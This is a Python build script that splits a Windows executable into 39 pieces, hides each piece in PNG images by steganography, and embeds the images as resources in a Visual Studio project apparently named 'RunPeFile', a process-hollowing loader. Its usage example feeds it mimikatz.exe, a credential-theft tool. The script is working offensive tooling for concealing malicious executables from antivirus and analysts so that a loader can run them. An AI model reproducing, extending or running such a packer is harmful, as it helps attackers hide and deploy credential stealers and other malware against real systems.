"""
File splitter script that divides a file into parts, processes them with steganography,
and generates RC (Resource) files 
"""

import os
import sys
import subprocess
import argparse
from datetime import datetime
from pathlib import Path
import xml.etree.ElementTree as ET

# Configuration Constants
NUM_SPLIT_PARTS = 39
STEG_SCRIPT = "DwtStegPeFileToPng.py"
ENCODED_PNGS_DIR = "EncodedPngs"
RUNPE_DIR = "RunPeFile"
RC_FILENAME = "Resource.rc"
HEADER_FILENAME = "Resource.h"
BASE_RESOURCE_ID = 1000

class Colors:
    """ANSI color codes for terminal output"""
    def __init__(self):
        if sys.stdout.isatty():
            if os.name == 'nt':
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
                except:
                    pass
            
            self.BLUE = '\033[94m'
            self.GREEN = '\033[92m' 
            self.YELLOW = '\033[93m'
            self.RED = '\033[91m'
            self.CYAN = '\033[96m'
            self.MAGENTA = '\033[95m'
            self.BOLD = '\033[1m'
            self.GRAY = '\033[90m'
            self.WHITE = '\033[97m'
            self.END = '\033[0m'
        else:
            for attr in ['BLUE', 'GREEN', 'YELLOW', 'RED', 'CYAN', 'MAGENTA', 
                        'BOLD', 'GRAY', 'WHITE', 'END']:
                setattr(self, attr, '')

colors = Colors()

class Logger:
    """Centralized logging with colored output"""
    
    @staticmethod
    def info(message: str):
        print(f"{colors.BLUE}[*]{colors.END} {message}")
    
    @staticmethod
    def success(message: str):
        print(f"{colors.GREEN}[+]{colors.END} {message}")
    
    @staticmethod
    def warning(message: str):
        print(f"{colors.YELLOW}[!]{colors.END} {message}")
    
    @staticmethod
    def error(message: str):
        print(f"{colors.RED}[-]{colors.END} {message}")
    
    @staticmethod
    def debug(message: str):
        print(f"{colors.GRAY}[i]{colors.END} {message}")
    
    @staticmethod
    def print_banner(title: str):
        border = "=" * 60
        print(f"\n{colors.MAGENTA}{border}{colors.END}")
        print(f"{colors.BOLD}{colors.CYAN}        {title}{colors.END}")
        print(f"{colors.MAGENTA}{border}{colors.END}")

class FileSplitter:
    """Handles file splitting operations"""
    
    def __init__(self, input_file: str):
        self.input_path = Path(input_file)
        self.split_files = []
        
        if not self.input_path.exists():
            raise FileNotFoundError(f"Input file not found: {input_file}")
        
        self.file_size = self.input_path.stat().st_size
        if self.file_size == 0:
            raise ValueError("Cannot split an empty file")
        
        Logger.info(f"File size: {colors.CYAN}{self.file_size:,}{colors.END} bytes")
        Logger.info(f"Split parts: {colors.CYAN}{NUM_SPLIT_PARTS}{colors.END} (hierarchical)")
        
        # Calculate expected sizes for hierarchical split
        self._calculate_hierarchical_sizes()
    
    def _calculate_hierarchical_sizes(self):
        """Calculate and display expected sizes for hierarchical splitting"""
        # Simulate the recursive split to get expected sizes
        dummy_sizes = self._calculate_split_sizes(self.file_size, NUM_SPLIT_PARTS)
        
        Logger.info(f"Expected part sizes: {colors.CYAN}{min(dummy_sizes):,}-{max(dummy_sizes):,}{colors.END} bytes")
        
        for i, size in enumerate(dummy_sizes, 1):
            Logger.debug(f"Part {i:02d}: {colors.CYAN}{size:,}{colors.END} bytes")
    
    def _calculate_split_sizes(self, total_size: int, target_parts: int) -> list:
        """Calculate expected sizes without actually splitting data"""
        if target_parts == 1:
            return [total_size]
        
        # Find split point
        if target_parts & (target_parts - 1) == 0:  # target_parts is power of 2
            split_count = target_parts // 2
        else:
            split_count = target_parts // 2
        
        # Calculate sizes for each half
        left_size = total_size // 2
        right_size = total_size - left_size
        
        # Recursively calculate sizes
        left_sizes = self._calculate_split_sizes(left_size, split_count)
        right_sizes = self._calculate_split_sizes(right_size, target_parts - split_count)
        
        return left_sizes + right_sizes
    
    def split(self) -> list:
        """Split the file hierarchically based on NUM_SPLIT_PARTS"""
        base_name = self.input_path.stem
        extension = self.input_path.suffix
        split_dir = self.input_path.parent
        
        # Read entire file into memory for hierarchical splitting
        with open(self.input_path, 'rb') as input_file:
            file_data = input_file.read()
        
        Logger.info(f"Performing hierarchical split into {NUM_SPLIT_PARTS} parts")
        
        # Perform recursive binary splitting until we reach NUM_SPLIT_PARTS
        parts = self._recursive_split(file_data, NUM_SPLIT_PARTS)
        
        # Write the final parts
        for i, data_chunk in enumerate(parts, 1):
            filename = f"{base_name}_part{i:02d}{extension}"
            filepath = split_dir / filename
            
            with open(filepath, 'wb') as output_file:
                output_file.write(data_chunk)
            
            self.split_files.append(filepath)
            Logger.debug(f"Created: {colors.WHITE}{filename}{colors.END} ({colors.CYAN}{len(data_chunk):,}{colors.END} bytes)")
        
        return self.split_files
    
    def _recursive_split(self, data: bytes, target_parts: int) -> list:
        """Recursively split data into target_parts using binary splits"""
        if target_parts == 1:
            return [data]
        
        # Find the largest power of 2 that's <= target_parts
        import math
        if target_parts & (target_parts - 1) == 0:  # target_parts is power of 2
            split_count = target_parts // 2
        else:
            # For non-powers of 2, split as evenly as possible
            split_count = target_parts // 2
        
        # Split data in half
        mid_point = len(data) // 2
        left_half = data[:mid_point]
        right_half = data[mid_point:]
        
        # Recursively split each half
        left_parts = self._recursive_split(left_half, split_count)
        right_parts = self._recursive_split(right_half, target_parts - split_count)
        
        return left_parts + right_parts
    
    def cleanup(self):
        """Delete the split files"""
        for filepath in self.split_files:
            try:
                filepath.unlink()
                Logger.debug(f"Deleted: {colors.GRAY}{filepath.name}{colors.END}")
            except Exception as e:
                Logger.warning(f"Failed to delete {filepath.name}: {e}")

class SteganographyProcessor:
    """Handles steganographic encoding of split files"""
    
    def __init__(self, png_filename: str, output_dir: Path):
        self.png_filename = png_filename
        self.output_dir = output_dir
        self.output_dir.mkdir(exist_ok=True)
        self.processed_files = []
        
        # Validate builder script exists
        script_path = Path(STEG_SCRIPT)
        if not script_path.exists():
            raise FileNotFoundError(f"Steganography script not found: {STEG_SCRIPT}")
        
        self.script_path = script_path.resolve()
    
    def process_file(self, split_file: Path, part_num: int) -> str | None:
        """Process a single split file through steganography"""
        base_name = split_file.stem
        output_filename = f"{base_name}.png"
        output_path = self.output_dir / output_filename
        
        cmd = [
            sys.executable,
            str(self.script_path),
            "--encode",
            "--png", self.png_filename,
            "--file", str(split_file),
            "--output", str(output_path)
        ]
        
        try:
            # Run with suppressed output
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            
            # Get the size of the generated PNG file
            png_size = output_path.stat().st_size
            Logger.success(f"Processed part {colors.CYAN}{part_num:02d}{colors.END} -> {colors.WHITE}{output_filename}{colors.END} ({colors.CYAN}{png_size:,}{colors.END} bytes)")
            self.processed_files.append(output_filename)
            return output_filename
        
        except subprocess.CalledProcessError as e:
            Logger.error(f"Failed to process part {part_num:02d} (return code: {e.returncode})")
            if e.stderr:
                Logger.error(f"Error details: {e.stderr.strip()}")
            return None
        
        except Exception as e:
            Logger.error(f"Unexpected error processing part {part_num:02d}: {e}")
            return None
    
    def process_all(self, split_files: list) -> list:
        """Process all split files"""
        Logger.info("Processing files through steganography...")
        
        for i, split_file in enumerate(split_files, 1):
            self.process_file(split_file, i)
        
        return self.processed_files

class ResourceGenerator:
    """Generates Visual Studio RC and header files"""
    
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.output_dir.mkdir(exist_ok=True)
    
    def generate_header(self, png_files: list) -> Path:
        """Generate Resource.h header file"""
        header_path = self.output_dir / HEADER_FILENAME
        
        # Get current timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(header_path, 'w') as h_file:
            h_file.write("// Resource header file generated by FileConstructor.py\n")
            h_file.write(f"// Generated on: {timestamp}\n\n")
            h_file.write("#pragma once\n\n")
            
            # Add constants
            h_file.write(f"#define BASE_RESOURCE_ID    {BASE_RESOURCE_ID}\n")
            h_file.write(f"#define NUMBER_OF_PNGS      {len(png_files)}\n\n")
            
            # Generate resource IDs
            for i, png_file in enumerate(png_files):
                resource_name = Path(png_file).stem.upper().replace('-', '_').replace(' ', '_')
                resource_id = BASE_RESOURCE_ID + i + 1
                h_file.write(f"#define IDR_{resource_name}    {resource_id}\n")
        
        return header_path
    
    def generate_rc(self, png_files: list) -> Path:
        """Generate Resource.rc file"""
        rc_path = self.output_dir / RC_FILENAME
        
        with open(rc_path, 'w') as rc_file:
            rc_file.write("// Resource file generated by FileConstructor.py\n")
            rc_file.write("#include \"windows.h\"\n")
            rc_file.write("#include \"resource.h\"\n\n")
            rc_file.write("LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US\n\n")
            rc_file.write("// RCDATA Resources\n")
            
            for i, png_file in enumerate(png_files):
                resource_name = Path(png_file).stem.upper().replace('-', '_').replace(' ', '_')
                resource_id = BASE_RESOURCE_ID + i + 1
                relative_path = f"..\\{ENCODED_PNGS_DIR}\\{png_file}"
                rc_file.write(f"IDR_{resource_name}    RCDATA    \"{relative_path}\"\n")
        
        return rc_path
    
    def generate(self, png_files: list) -> tuple[Path, Path]:
        """Generate both RC and header files"""
        Logger.info("Generating RC files...")
        
        header_path = self.generate_header(png_files)
        rc_path = self.generate_rc(png_files)
        
        Logger.success(f"Generated {colors.WHITE}{RC_FILENAME}{colors.END} with {colors.CYAN}{len(png_files)}{colors.END} resources")
        Logger.success(f"Generated {colors.WHITE}{HEADER_FILENAME}{colors.END}")
        
        return rc_path, header_path

class ProjectUpdater:
    """Updates Visual Studio project file"""
    
    def __init__(self, project_path: str):
        self.project_path = Path(project_path).resolve()
        
        if not self.project_path.exists():
            raise FileNotFoundError(f"Project file not found: {project_path}")
    
    def update(self, rc_files: list, rc_dir: Path):
        """Update the Visual Studio project file"""
        Logger.info(f"Updating Visual Studio project: {colors.WHITE}{self.project_path.name}{colors.END}")
        
        try:
            tree = ET.parse(self.project_path)
            root = tree.getroot()
            
            # Find namespace
            namespace = ""
            if root.tag.startswith('{'):
                namespace = root.tag.split('}')[0] + '}'
            
            # Remove existing ResourceCompile items
            removed_count = 0
            for item_group in root.findall(f'{namespace}ItemGroup'):
                resource_compiles = item_group.findall(f'{namespace}ResourceCompile')
                if resource_compiles:
                    for rc in resource_compiles:
                        Logger.debug(f"Removing RC reference: {colors.GRAY}{rc.get('Include', 'Unknown')}{colors.END}")
                        item_group.remove(rc)
                        removed_count += 1
                    
                    if len(item_group) == 0:
                        root.remove(item_group)
            
            # Add new ResourceCompile items
            if rc_files:
                new_item_group = ET.SubElement(root, f'{namespace}ItemGroup')
                project_dir = self.project_path.parent
                
                for rc_file in rc_files:
                    rc_path = rc_dir / rc_file
                    try:
                        relative_path = rc_path.relative_to(project_dir)
                        path_str = str(relative_path).replace('/', '\\')
                    except ValueError:
                        path_str = str(rc_path)
                    
                    rc_element = ET.SubElement(new_item_group, f'{namespace}ResourceCompile')
                    rc_element.set('Include', path_str)
                    Logger.debug(f"Added RC reference: {colors.CYAN}{path_str}{colors.END}")
            
            # Write back to file
            if namespace:
                ET.register_namespace('', namespace.strip('{}'))
            
            tree.write(self.project_path, encoding='utf-8', xml_declaration=True)
            Logger.success(f"Updated project file ({colors.CYAN}{removed_count}{colors.END} removed, {colors.CYAN}{len(rc_files)}{colors.END} added)")
            
        except ET.ParseError as e:
            Logger.error(f"Failed to parse project file: {e}")
            raise
        except Exception as e:
            Logger.error(f"Failed to update project file: {e}")
            raise

class FileConstructor:
    """Main application class"""
    
    def __init__(self, input_file: str, png_filename: str, project_path: str | None = None):
        self.input_file = input_file
        self.png_filename = png_filename
        self.project_path = project_path or f"./{RUNPE_DIR}/RunPeFile.vcxproj"
        
        # Setup directories
        self.cwd = Path.cwd()
        self.encoded_dir = self.cwd / ENCODED_PNGS_DIR
        self.runpe_dir = self.cwd / RUNPE_DIR
        
        # Initialize components
        self.splitter = FileSplitter(input_file)
        self.processor = SteganographyProcessor(png_filename, self.encoded_dir)
        self.generator = ResourceGenerator(self.runpe_dir)
        
        try:
            self.updater = ProjectUpdater(self.project_path)
        except FileNotFoundError:
            Logger.warning(f"Project file not found: {self.project_path}")
            self.updater = None
    
    def run(self):
        """Execute the complete file construction process"""
        Logger.print_banner("DWT Steganography File Constructor")
        
        Logger.info(f"Input PE file: {colors.WHITE}{self.input_file}{colors.END}")
        Logger.info(f"Cover image: {colors.WHITE}{self.png_filename}{colors.END}")
        Logger.info(f"Encoded PNGs directory: {colors.WHITE}{self.encoded_dir}{colors.END}")
        Logger.info(f"RC files directory: {colors.WHITE}{self.runpe_dir}{colors.END}")
        
        try:
            # Step 1: Split file
            Logger.info("Splitting input file...")
            split_files = self.splitter.split()
            
            # Step 2: Process through steganography
            processed_files = self.processor.process_all(split_files)
            
            if not processed_files:
                Logger.error("No files were successfully processed")
                return False
            
            # Step 3: Generate RC files
            rc_path, header_path = self.generator.generate(processed_files)
            
            # Step 4: Update Visual Studio project
            if self.updater:
                self.updater.update([RC_FILENAME], self.runpe_dir)
            
            # Step 5: Cleanup split files
            Logger.info("Cleaning up temporary files...")
            self.splitter.cleanup()
            
            # Final summary
            Logger.success("File construction completed successfully!")
            Logger.info(f"Split files: {colors.GRAY}cleaned up{colors.END}")
            Logger.info(f"PNG files: {colors.CYAN}{len(processed_files)}{colors.END} in {colors.WHITE}{self.encoded_dir}{colors.END}")
            Logger.info(f"RC files: {colors.WHITE}{rc_path.name}, {header_path.name}{colors.END} in {colors.WHITE}{self.runpe_dir}{colors.END}")
            
            return True
            
        except Exception as e:
            Logger.error(f"Construction failed: {e}")
            # Attempt cleanup on failure
            try:
                self.splitter.cleanup()
            except:
                pass
            return False

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="DWT Steganography File Constructor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{colors.GRAY}Configuration:{colors.END}
  Split parts: {colors.CYAN}{NUM_SPLIT_PARTS}{colors.END}
  Steg script: {colors.CYAN}{STEG_SCRIPT}{colors.END}
  Output directory: {colors.CYAN}{ENCODED_PNGS_DIR}{colors.END}

{colors.GRAY}Examples:{colors.END}
  python FileConstructor.py --pe mimikatz.exe --png cover.png
  python FileConstructor.py --pe data.bin --png image.png --project ./MyProject/Project.vcxproj
        """
    )
    
    parser.add_argument(
        "--pe", 
        required=True, 
        help="PE file to split and encode"
    )
    
    parser.add_argument(
        "--png", 
        required=True, 
        help="Cover PNG image for steganography"
    )
    
    parser.add_argument(
        "--project", 
        help="Visual Studio project file path (optional)"
    )
    
    # Parse arguments
    try:
        args = parser.parse_args()
    except SystemExit:
        # argparse calls sys.exit on error, we want to handle it gracefully
        return
    
    # Validate files exist
    if not Path(args.pe).exists():
        Logger.error(f"PE file not found: {args.pe}")
        sys.exit(1)
    
    if not Path(args.png).exists():
        Logger.error(f"PNG file not found: {args.png}")
        sys.exit(1)
    
    constructor = FileConstructor(args.pe, args.png, args.project)
    success = constructor.run()
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()